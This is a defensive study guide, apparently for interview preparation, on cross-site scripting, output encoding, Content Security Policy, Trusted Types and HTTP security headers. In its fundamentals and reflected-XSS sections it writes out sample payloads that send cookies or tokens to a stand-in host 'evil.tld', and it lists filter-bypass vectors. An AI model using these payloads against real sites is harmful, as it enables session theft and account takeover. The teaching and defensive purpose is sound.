# Cross-Site Scripting (XSS), CSP & Security Headers

**Cross-Site Scripting (XSS)** is the class of vulnerabilities where an attacker gets
their own JavaScript to run in *your* origin, inside *your* victim's browser. Because that
script runs with the victim's identity and inside your security origin, it can read the
DOM, steal or ride on session cookies and tokens, make authenticated requests, keylog,
rewrite the page, and pivot into full account takeover. XSS has been on the OWASP Top 10
for two decades; in the 2021 edition it is folded into **A03:2021 – Injection** (XSS is
"just" injection into an HTML/JS execution context). It remains one of the most common and
most impactful web bugs.

This topic is **language- and framework-agnostic**. We teach the *mechanism* — how the
attacker's data reaches an execution context, and the *only* reliable fix: context-aware
output encoding plus a defense-in-depth wall of **Content Security Policy (CSP)** and
**HTTP security headers**. We describe attacks with concrete payloads and defenses with
concrete header syntax, not one framework's templating API.

> [!KEY-TAKEAWAY]
> There is one root cause and one root fix. **Root cause:** untrusted data is placed into
> a page such that the browser parses it as *code* (markup or script) instead of *text*.
> **Root fix:** encode/escape output for the *specific context* it lands in (HTML body,
> attribute, JS, URL, CSS), lean on framework auto-escaping, avoid dangerous sinks, and
> use CSP + Trusted Types as a second wall for when encoding is missed. Input validation
> and HttpOnly help but are **not** the primary fix.

## XSS Fundamentals

XSS occurs when an application takes data it does not fully control and includes it in a
response (or DOM) in a way that the browser interprets as executable content rather than
inert text. The classic proof-of-concept is `<script>alert(1)</script>`, but real
payloads exfiltrate data: `<script>new Image().src='//evil.tld/c?'+document.cookie</script>`
or `<script>fetch('//evil.tld',{method:'POST',body:localStorage.getItem('token')})</script>`.

Why it matters: injected script runs **in the victim's browser, in your origin**, so it
inherits everything the same-origin policy grants your page — cookies (unless `HttpOnly`),
`localStorage`/`sessionStorage`, the DOM, and the ability to send credentialed requests to
your APIs. XSS therefore defeats CSRF tokens (the script can read them), can bypass much of
MFA (it acts *after* login), and is a common first step to full account takeover.

The three traditional categories differ by **where the malicious data is stored and how it
reaches the page**: **stored**, **reflected**, and **DOM-based**. A useful orthogonal split
is **server-side XSS** (the injected markup is in the HTTP response body the server sends)
vs **client-side / DOM XSS** (the vulnerability is entirely in client JavaScript; the
server may never see the payload).

> [!INTERVIEW]
> "What can an attacker actually do with XSS?" A strong answer goes past `alert(1)`:
> session/token theft, silent authenticated requests (transfer money, change email/
> password), keylogging and phishing overlays, reading the DOM (CSRF tokens, PII), and
> using the foothold as a beachhead (BeEF-style). The severity is "arbitrary code
> execution in the user's session," which is why it is High/Critical, not cosmetic.

## Stored XSS

**Stored (persistent) XSS** happens when the malicious payload is saved by the application
(database, comment, profile field, log, filename, support ticket) and later served to other
users. It is the most dangerous variant because it needs no per-victim trickery: every user
who views the poisoned resource is attacked, enabling a **worm** (Samy on MySpace, 2005,
infected ~1M profiles in ~20 hours).

Vulnerable pattern: a comment field stores `Great post! <script>…</script>` verbatim, and
the page renders stored comments with no output encoding. Exploit: attacker posts the
comment once; every reader executes the script. Correct defense: **HTML-encode on output**
when rendering the comment (`<` → `&lt;`), not (only) on input, plus CSP.

> [!WARNING]
> "Sanitize on input and you're safe" is a trap. The same stored string may be rendered
> into many *different* contexts (HTML body, an attribute, a JSON blob, a JS string), each
> needing *different* encoding. Encoding must happen at the point of output, for that
> output's context. Store the raw data; encode when you emit it.

## Reflected XSS

**Reflected (non-persistent) XSS** occurs when data from the *current* request — a query
parameter, form field, or path segment — is echoed straight back into the response without
encoding. It is not stored; the payload lives in a crafted URL the attacker must trick the
victim into opening (phishing link, malicious ad).

Vulnerable pattern: a search page renders `You searched for: <the q parameter>` directly.
Exploit URL: `https://site.tld/search?q=<script>document.location='//evil.tld/?c='+document.cookie</script>`.
The victim clicks; the server reflects the script into the HTML; it runs in the site's
origin. Correct defense: context-aware output encoding of `q` before it enters the HTML,
plus CSP so an injected inline `<script>` is blocked even if encoding is missed.

Reflected XSS is often dismissed as lower-severity because it needs a lured click, but a
convincing link, an open redirect, or a widely-shared URL makes it very real.

## DOM-Based XSS: Source to Sink

**DOM-based XSS** is a client-side flaw: untrusted data flows from a **source** (something
the attacker influences, e.g. `location.hash`, `location.search`, `document.referrer`,
`window.name`, `postMessage` data) into a dangerous **sink** (an API that turns strings
into DOM/markup/code, e.g. `element.innerHTML`, `document.write`, `eval`, `setTimeout` with
a string, `location = …`, `el.setAttribute('onclick', …)`). The exploit executes purely in
JavaScript — **the payload may never reach the server**, so server-side WAFs and encoding
never see it, and it can hide entirely behind the URL fragment (`#…`) which browsers do not
send to the server.

Vulnerable pattern:
```js
// URL: https://site.tld/page#<img src=x onerror=alert(document.domain)>
document.getElementById('out').innerHTML = decodeURIComponent(location.hash.slice(1));
```
The `location.hash` **source** flows into the `innerHTML` **sink**; the `<img onerror>`
runs. Correct defense: don't build markup from untrusted strings — use `textContent`
instead of `innerHTML`; if HTML is required, sanitize with a vetted library (DOMPurify) or
enforce **Trusted Types**. Because the payload is in the fragment, the fix must be in the
client code, not the server.

> [!INTERVIEW]
> DOM-XSS is the "source → sink" question. Be able to name sources (`location.*`,
> `document.referrer`, `window.name`, `postMessage`) and sinks (`innerHTML`,
> `outerHTML`, `document.write`, `eval`, `Function`, `setTimeout`/`setInterval` with a
> string arg, `insertAdjacentHTML`, `el.src`/`el.href` for `javascript:` URLs). The fix
> is safe-sink usage + sanitization + Trusted Types, *not* server-side encoding.

## Execution Contexts and Output Encoding

The single most important XSS concept: **the correct encoding depends on the context** the
data lands in. HTML has several sub-grammars, and a value that is safe in one is dangerous
in another. This is why "just HTML-escape everything" is insufficient and why
context-*aware* encoding is the real fix (OWASP XSS Prevention Cheat Sheet).

| Context | Example | Encode |
|---|---|---|
| HTML element body | `<div>DATA</div>` | HTML-entity encode `< > & " '` |
| HTML attribute (quoted) | `<input value="DATA">` | attribute-encode; always quote attributes |
| Unquoted attribute | `<input value=DATA>` | **avoid** — space/`/`/`>` break out; quote it |
| JavaScript string | `<script>var x='DATA'</script>` | JS-string escape (`\xHH`), or emit as JSON |
| URL / query param | `<a href="/x?q=DATA">` | URL-encode (percent-encode) the value |
| CSS value | `<style>a{color:DATA}</style>` | CSS-escape; better: don't put user data in CSS |

Two gotchas interviewers probe: (1) **encoding for the wrong context is still a vuln** —
HTML-encoding a value that is placed inside a `<script>` block does nothing to stop
`</script><script>…`. (2) **Nested contexts** (a URL inside an HTML attribute inside a JS
string) require layered encoding in the right order. This complexity is exactly why you
should let a framework/templating engine that understands contexts do the encoding.

> [!WARNING]
> Putting *any* untrusted data inside a `<script>` block, an inline event handler
> (`onclick="…"`), or a `javascript:` URI is dangerous even with encoding, because you're
> injecting into a scripting context. OWASP's rule: don't do it. Pass data via
> `data-*` attributes or a JSON island and read it with safe DOM APIs instead.

## Framework Auto-Escaping

Modern templating/UI frameworks (React JSX, Angular, Vue, most server template engines)
**auto-escape by default** for the HTML context: interpolating `{userData}` produces
escaped text, so the #1 defense against XSS in practice is "use the framework's default
rendering and don't fight it." React escapes string children; Angular treats interpolated
values as untrusted and sanitizes.

The interviewer's real target is the **escape hatches** that opt out of auto-escaping:

- React: `dangerouslySetInnerHTML={{__html: userData}}` — the name is a warning.
- Angular: `[innerHTML]` binding, or `bypassSecurityTrustHtml`/`…TrustScript`.
- Vue: `v-html`.
- Server templates: "raw"/"safe"/"unescaped" filters (`| safe`, `{{{ }}}`, `raw()`).

Any of these reintroduces XSS if fed untrusted data. Also note auto-escaping is usually
tuned for the HTML *body* context and does **not** automatically protect URL attributes
(`href="javascript:…"`), inline styles, or `<script>` blocks — those still need explicit
handling.

> [!INTERVIEW]
> "React is XSS-proof, right?" No. React auto-escapes text children, but
> `dangerouslySetInnerHTML`, unsanitized `href`/`src` (`javascript:` URLs), `<a target>`
> reverse-tabnabbing, `ref`-based direct DOM writes, and server-side rendering of
> attacker-controlled JSON into a `<script>` island all reopen the door.

## Input Validation as Defense in Depth

Input validation (allowlist what a field may contain — length, charset, format, e.g. a
zip code is digits) is valuable and part of ASVS, but it is **defense in depth, not the
primary XSS fix**. Reasons: many fields legitimately contain characters used in payloads
(names with apostrophes, comments with `<`, rich-text bios); the same value is rendered
into multiple contexts each needing different encoding; and validation cannot anticipate
every sink. Reject clearly-invalid input, but rely on **output encoding** for correctness.

For fields that must contain HTML (WYSIWYG editors, markdown), you cannot merely encode —
you must **sanitize**: parse the HTML and strip dangerous elements/attributes with a
robust, maintained library (DOMPurify client-side; OWASP Java HTML Sanitizer / equivalents
server-side). Never write your own HTML sanitizer with regexes — HTML parsing is full of
mutation and mXSS edge cases that hand-rolled filters miss.

> [!WARNING]
> Blocklist input filters (strip `<script>`, block `javascript:`) are trivially bypassed:
> `<img src=x onerror=…>`, `<svg onload=…>`, `<iframe srcdoc=…>`, mixed case, null bytes,
> HTML entities, `java\tscript:`, and mutation XSS all evade naive blocklists. Prefer
> allowlist validation for structure and *always* encode/sanitize on output.

## Dangerous Sinks

A **sink** is a browser API that converts a string into live DOM, markup, or code. Passing
untrusted data into one is the mechanism of DOM XSS. Know the list:

- **Markup sinks:** `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`/
  `document.writeln`, `DOMParser.parseFromString`, `Range.createContextualFragment`.
- **Code-execution sinks:** `eval`, `Function(...)`, `setTimeout("code",…)` /
  `setInterval("code",…)` with a *string*, `setAttribute('on…', …)` for event handlers.
- **URL/navigation sinks:** assigning a `javascript:` URL to `location`, `element.href`,
  `element.src`, `window.open`, or a form `action`.

Safe replacements: use `textContent`/`innerText` instead of `innerHTML`; build DOM with
`createElement` + `append`; pass a *function* (not a string) to `setTimeout`; never `eval`
JSON — use `JSON.parse`. If you truly need to inject HTML, run it through a sanitizer and/or
enforce Trusted Types so raw strings can't reach these sinks at all.

> [!KEY-TAKEAWAY]
> `element.textContent = userData` is safe (browser treats it as text);
> `element.innerHTML = userData` is dangerous (browser parses it as markup and runs
> `onerror`/`onload` handlers even though `<script>` inserted via innerHTML does *not*
> execute — the danger is event-handler attributes and other elements).

## Trusted Types

**Trusted Types** is a browser security mechanism (Chromium/CSP-based) that eliminates
**DOM-based XSS** by locking down the dangerous DOM sinks. When enabled via CSP, the
browser refuses to accept a plain string at an "injection sink" (`innerHTML`,
`script.src`, `eval`, etc.) — the value must be a typed object (`TrustedHTML`,
`TrustedScript`, `TrustedScriptURL`) produced by a **policy** you explicitly define and
register. This forces all string-to-DOM flows through a small, auditable choke point
(where you sanitize), instead of scattering safety across the codebase.

Enable it with headers:
```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default myPolicy;
```
`require-trusted-types-for 'script'` turns on enforcement at script sinks;
`trusted-types` names the allowed policy factories (`'none'` disallows any policy). A
default policy that runs DOMPurify converts every raw string assigned to `innerHTML` into
sanitized `TrustedHTML`. The security win: it changes the default from "any string can
reach a sink" to "only reviewed code can create trusted values," so a missed encoding
becomes a caught runtime error, not an exploit.

> [!INTERVIEW]
> Trusted Types addresses the *DOM XSS* half of the problem (client-side sinks); nonce/
> hash-based CSP addresses the *injected-script* half (server-reflected `<script>`).
> Google credits Trusted Types + strict CSP with dramatically reducing XSS across its
> products. Support is Chromium-based; use it as progressive enhancement, and keep
> output encoding as the baseline for non-supporting browsers.

## Content Security Policy Fundamentals

**Content Security Policy (CSP)** is a defense-in-depth HTTP response header (CSP Level 3)
that tells the browser which sources of script, style, images, frames, etc. are allowed to
load and execute. Its headline value: even if an attacker injects a `<script>` (i.e. your
encoding failed), a good CSP stops it from executing. CSP is a **second line of defense**,
not a replacement for output encoding.

The policy is a list of **directives**, each with a source list:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```
- `default-src` is the fallback for most `*-src` directives (script, style, img, connect,
  font, media, …) that you don't set explicitly. **It does not cover** `frame-ancestors`,
  `base-uri`, `form-action`, or `report-uri` — those must be set separately.
- `object-src 'none'` (kill Flash/plugin vectors) and `base-uri 'none'` (stop `<base>`
  hijacking of relative script URLs) are strongly recommended baselines.
- Two channels: `Content-Security-Policy` (enforce) and
  `Content-Security-Policy-Report-Only` (log violations without blocking) — use
  report-only to roll out a policy safely.

Keywords must be quoted: `'self'`, `'none'`, `'unsafe-inline'`, `'unsafe-eval'`,
`'nonce-…'`, `'strict-dynamic'`. Note CSP does **not** stop data exfiltration perfectly
(DNS prefetch, `navigator.sendBeacon` to allowed hosts, etc.) and is not a substitute for
fixing the underlying injection.

> [!WARNING]
> A common misconception: CSP blocks XSS. It **mitigates** the *execution* of injected
> script; it does nothing about the injection itself and can be bypassed if misconfigured
> (`unsafe-inline`, overly broad allowlists, JSONP/AngularJS gadgets on allowed hosts).
> Report a missing/weak CSP as defense-in-depth, and always fix the injection too.

## CSP Script Sources: nonces, hashes, unsafe-inline

The core of a script-focused CSP is **how you allow your own inline/loaded scripts while
blocking injected ones**. Options, worst to best:

- **`'unsafe-inline'`** — allows *all* inline `<script>` and inline event handlers. This
  effectively **disables CSP's XSS protection**, because an injected inline script is now
  allowed. Avoid it; its presence is a finding.
- **Host allowlist** (`script-src 'self' https://cdn.tld`) — allows scripts only from named
  origins. Better than `unsafe-inline` but brittle: bypassable via open JSONP endpoints,
  outdated AngularJS, or user-uploaded content on an allowed host (see next section).
- **Nonce** (`script-src 'nonce-r4nd0m'`) — the server generates a fresh, unpredictable,
  per-response random value, puts it in the header *and* on each legitimate tag
  (`<script nonce="r4nd0m">`). Injected scripts don't know the nonce, so they're blocked.
  The nonce **must be cryptographically random and unique per response** — a static or
  reused nonce is worthless.
- **Hash** (`script-src 'sha256-BASE64…'`) — the policy lists the base64 SHA-256/384/512
  of the exact inline script content. The browser hashes each inline block and allows only
  matching ones. Great for static inline scripts (no server-side per-request work); awkward
  when content changes.

Nonce vs hash: **nonce** suits server-rendered pages that can inject a fresh value per
response; **hash** suits static content and CDNs/edge caching where you can't set a
per-request nonce. Both are vastly stronger than host allowlists.

> [!KEY-TAKEAWAY]
> `'unsafe-inline'` is ignored by the browser when a nonce or hash is present (CSP2+),
> so old browsers that don't understand nonces still get *some* policy while modern ones
> enforce the strong one — a common backward-compat trick: `script-src 'nonce-…'
> 'unsafe-inline'` (the `unsafe-inline` is a no-op where nonces are supported).

## strict-dynamic and Why Allowlist CSP Fails

Google's research (Weichselbaum et al., "CSP Is Dead, Long Live CSP", 2016) analyzed
billions of real policies and found the **host-allowlist model is broken**: ~94% of
allowlist CSPs were bypassable, because trusted CDNs host JSONP endpoints, Angular, and
other **script gadgets** an attacker can abuse to run code from an allowed origin. Building
and maintaining a correct allowlist is also operationally painful.

The recommended modern approach is a **strict, nonce-based CSP with `'strict-dynamic'`**:
```
Content-Security-Policy:
  script-src 'nonce-r4nd0m' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none'; base-uri 'none'
```
- `'strict-dynamic'` says: trust scripts loaded *by* an already-trusted (nonced) script,
  and **ignore host allowlists and `'unsafe-inline'`** in browsers that support it. This
  lets a nonced bootstrap loader pull in its dependencies without you enumerating every CDN
  host, while still blocking injected `<script src>` (it lacks the nonce and isn't loaded
  by trusted code).
- The trailing `https:` and `'unsafe-inline'` are **fallbacks** for older browsers that
  don't understand `strict-dynamic`; supporting browsers ignore them.

This is the policy OWASP and Google recommend: it's easier to maintain (no host list),
harder to bypass, and scales. Add `require-trusted-types-for 'script'` to also close DOM
XSS.

> [!INTERVIEW]
> "Why is `script-src 'self' https://apis.google.com` weak?" Because allowlisted hosts
> often expose JSONP or framework gadgets (`https://apis.google.com/...callback=alert`),
> letting an attacker execute arbitrary code from an *allowed* origin. Answer with
> nonce + `strict-dynamic` as the fix, and cite the "CSP Is Dead" study.

## CSP Reporting

CSP can **report** violations so you can monitor attacks and roll out policies without
breaking the site. Two mechanisms:

- **`report-uri /csp-endpoint`** (older, widely supported): the browser POSTs a JSON
  violation report to the URL when a directive is violated.
- **`report-to <group>`** (newer, Reporting API): references a group defined in the
  `Report-To` (now `Reporting-Endpoints`) header; supersedes `report-uri`. For
  compatibility you often send **both**.

Combine with **`Content-Security-Policy-Report-Only`**: deploy the intended strict policy
in report-only mode first, watch the violation stream for legitimate resources you forgot,
fix the policy, *then* switch to enforcing. Reports are also an early-warning signal of XSS
attempts in production. Beware report noise from browser extensions injecting content.

> [!TIP]
> Rollout recipe: (1) ship `Content-Security-Policy-Report-Only` with your target strict
> policy + a report endpoint; (2) triage reports, whitelist genuine gaps (or better, add
> nonces); (3) flip to `Content-Security-Policy` (enforce) once the report stream is clean.

## HSTS and Preload

**HTTP Strict Transport Security (HSTS)** — the `Strict-Transport-Security` response header
— tells the browser to only ever connect to this host over HTTPS for a given duration,
even if the user types `http://` or clicks an `http` link. It defeats **SSL-stripping**
man-in-the-middle attacks (sslstrip) that downgrade the first, cleartext request.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```
- `max-age` (seconds) — how long the browser remembers to force HTTPS (2 years is the
  common preload requirement; don't start with a huge value if unsure).
- `includeSubDomains` — apply to every subdomain (all must support HTTPS).
- `preload` — opt-in to the browser **HSTS preload list** (hstspreload.org), baked into
  browsers so even the *first-ever* request is forced HTTPS, closing the trust-on-first-use
  gap. Requires `max-age ≥ 31536000`, `includeSubDomains`, and `preload`. Preloading is
  **hard to undo** and propagates slowly — commit deliberately.

Gotchas: HSTS is ignored over plain HTTP (must be sent on an HTTPS response) and does not
apply to the very first visit unless preloaded. It protects transport, not application
bugs.

> [!WARNING]
> `includeSubDomains` + `preload` is a foot-gun if any subdomain (internal tools, legacy
> apps) can't do HTTPS — they become unreachable in browsers. Roll out with a short
> `max-age` first, verify, then raise it and add `preload`.

## X-Content-Type-Options nosniff

`X-Content-Type-Options: nosniff` disables browser **MIME sniffing** — the legacy behavior
where a browser ignores the declared `Content-Type` and guesses based on content. Sniffing
enabled attacks where a file uploaded/served as `text/plain` or an image is re-interpreted
as `text/html` or `application/javascript` and executed, turning a benign upload into
stored XSS.

With `nosniff`, the browser honors the declared type: a response must be `text/html` to be
rendered as HTML and must have a JS MIME type to be loaded as a `<script>`. This is a
one-line, no-downside header you should send on **every** response. It also enables
Cross-Origin-Read-Blocking (CORB) protections.

> [!TIP]
> `nosniff` only helps if you *also* send correct `Content-Type` headers. Serve
> user-uploaded files with an accurate, restrictive content type (and ideally from a
> separate, cookieless origin) so they can't be coerced into executing.

## Referrer-Policy

The `Referrer-Policy` header controls how much of the current URL is sent in the `Referer`
header on outbound requests and navigations. This is a **privacy and leakage** control:
full referrers can leak session tokens embedded in URLs, internal paths, or PII to third
parties and analytics.

Common values (least to most leaky):
- `no-referrer` — never send it.
- `same-origin` — send full URL to same origin, nothing cross-origin.
- `strict-origin` — send only the origin (scheme+host), and nothing on HTTPS→HTTP downgrade.
- **`strict-origin-when-cross-origin`** — full URL same-origin, origin-only cross-origin,
  nothing on downgrade. This is the modern **browser default** and a good baseline.
- `unsafe-url` — always send the full URL, including cross-origin. Avoid.

> [!KEY-TAKEAWAY]
> Never put secrets (session IDs, tokens, password-reset codes) in URLs in the first
> place — Referer leakage, browser history, server logs, and shared links all expose them.
> `Referrer-Policy` reduces the blast radius but is not a substitute for keeping secrets
> out of URLs.

## Clickjacking: X-Frame-Options vs frame-ancestors

**Clickjacking** frames your site invisibly (transparent iframe over attacker UI) and
tricks users into clicking sensitive actions ("UI redressing"). Two headers defend:

- **`X-Frame-Options`** (legacy): `DENY` (never framed) or `SAMEORIGIN` (only same-origin
  frames). The `ALLOW-FROM uri` value is **deprecated/poorly supported** — don't rely on
  it. It's a whole-page, single-value control.
- **`Content-Security-Policy: frame-ancestors`** (modern, CSP Level 2/3): the replacement.
  `frame-ancestors 'none'` = deny all framing (like `DENY`); `frame-ancestors 'self'` =
  same-origin only; `frame-ancestors 'self' https://partner.tld` = allow specific origins
  (multiple allowed, unlike X-Frame-Options). `frame-ancestors` is **not** governed by
  `default-src` and must be set explicitly.

Guidance: set **both** for coverage — `frame-ancestors` for modern browsers, and
`X-Frame-Options: DENY`/`SAMEORIGIN` as a fallback for old ones. Where they conflict,
modern browsers prefer `frame-ancestors`.

> [!INTERVIEW]
> "X-Frame-Options vs frame-ancestors?" `frame-ancestors` supersedes X-Frame-Options,
> supports multiple allowed origins, and is part of CSP. Keep X-Frame-Options only as a
> legacy fallback. Neither is set by `default-src`. Framing controls are separate from
> CSRF defenses (SameSite / tokens) — clickjacking rides a *framed* real session.

## Permissions-Policy

`Permissions-Policy` (formerly `Feature-Policy`) lets a site declare which **powerful
browser features** (camera, microphone, geolocation, USB, payment, fullscreen,
accelerometer, etc.) may be used, and by which origins — including in embedded iframes.
This shrinks the attack surface: even if XSS or a malicious embed occurs, it can't silently
turn on the camera or geolocation if the policy forbids it.

```
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(self)
```
- `feature=()` — an empty allowlist disables the feature for everyone (including self).
- `feature=(self)` — allow only the top-level origin.
- `feature=(self "https://embed.tld")` — allow self and a specific embed.

It is a hardening/defense-in-depth header, not a direct XSS fix, but disabling unused
capabilities is good hygiene and limits what a compromised page or third-party script/
iframe can abuse.

## HttpOnly and the Limits of Cookie-Theft Defense

The **`HttpOnly`** cookie attribute makes a cookie inaccessible to JavaScript
(`document.cookie` can't read it). This blocks the classic XSS payload that exfiltrates the
session cookie: `new Image().src='//evil/?'+document.cookie` can no longer read an HttpOnly
session cookie. Every session cookie should be `HttpOnly` (plus `Secure` and `SameSite`).

But understand the **limits** — this is the interviewer's trap: `HttpOnly` stops *reading*
the cookie value, it does **not** stop XSS from *using* the session. Injected script can
still make credentialed same-origin requests: the browser attaches the HttpOnly cookie
automatically, so the attacker rides the session (transfer funds, change email) without
ever seeing the cookie. It also does nothing for tokens stored in `localStorage`
(fully JS-readable — a reason some argue against storing bearer tokens there).

> [!KEY-TAKEAWAY]
> `HttpOnly` reduces the *impact* of XSS (no cookie exfiltration / offline replay) but
> does **not** prevent XSS or stop an in-page attacker from acting as the user. The real
> fix is preventing XSS (output encoding, CSP, Trusted Types). Treat HttpOnly as one layer,
> and never store session tokens somewhere JS can read them if you can avoid it.

## Common follow-up questions

- **"Walk me through fixing a reflected XSS in a search box."** Identify the sink (value
  echoed into HTML body/attribute), apply context-aware output encoding via the framework's
  auto-escaping, add a nonce-based CSP as defense in depth, and add a regression test with
  a payload like `"><script>`.
- **"Reflected vs stored vs DOM XSS — which is worst and why?"** Stored (no lure needed,
  hits every viewer, wormable). DOM-based is sneakiest (never touches the server, hides in
  the URL fragment). Reflected needs a lured click.
- **"Why isn't input validation enough?"** Same value renders into multiple contexts;
  legitimate data contains dangerous chars; blocklists are bypassable. Encode on output.
- **"How does CSP actually stop XSS if the script is already injected?"** It blocks
  *execution*: inline scripts without the right nonce/hash, and scripts from disallowed
  origins, don't run. It doesn't fix the injection.
- **"Why is a host-allowlist CSP considered weak?"** JSONP endpoints and framework gadgets
  on allowlisted CDNs let attackers run code from allowed origins; use nonce +
  strict-dynamic.
- **"Nonce vs hash?"** Nonce = fresh per-response random for dynamic server-rendered pages;
  hash = fixed digest of static inline scripts, cache-friendly.
- **"If cookies are HttpOnly, is XSS harmless?"** No — the attacker can't read the cookie
  but can still make authenticated requests in-page and do everything the user can.
- **"Which headers would you set on a hardened app?"** CSP (nonce + strict-dynamic +
  object-src 'none' + base-uri 'none' + frame-ancestors), HSTS (+ preload), nosniff,
  Referrer-Policy, X-Frame-Options (legacy fallback), Permissions-Policy, and Trusted
  Types.
- **"What is mutation XSS (mXSS)?"** Sanitized HTML that the browser's parser mutates on
  reinsertion into a form that becomes executable — why you use a maintained sanitizer,
  not regexes.

## References

- OWASP Top 10 2021 — A03:2021 Injection: https://owasp.org/Top10/A03_2021-Injection/
- OWASP Cross Site Scripting (XSS): https://owasp.org/www-community/attacks/xss/
- OWASP Cheat Sheet — Cross Site Scripting Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — DOM based XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — Content Security Policy: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- OWASP Cheat Sheet — HTTP Security Response Headers: https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
- OWASP Cheat Sheet — Clickjacking Defense: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
- OWASP WSTG — Testing for XSS: https://owasp.org/www-project-web-security-testing-guide/
- W3C Content Security Policy Level 3: https://www.w3.org/TR/CSP3/
- W3C Trusted Types: https://w3c.github.io/trusted-types/dist/spec/
- Weichselbaum et al., "CSP Is Dead, Long Live CSP" (ACM CCS 2016): https://research.google/pubs/pub45542/
- RFC 6797 — HTTP Strict Transport Security (HSTS): https://www.rfc-editor.org/rfc/rfc6797
- RFC 6265 — HTTP State Management (Cookies, HttpOnly): https://www.rfc-editor.org/rfc/rfc6265
- MDN — Referrer-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
- MDN — Permissions-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
- MDN — X-Content-Type-Options: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
- W3C Reporting API / report-to: https://www.w3.org/TR/reporting-1/
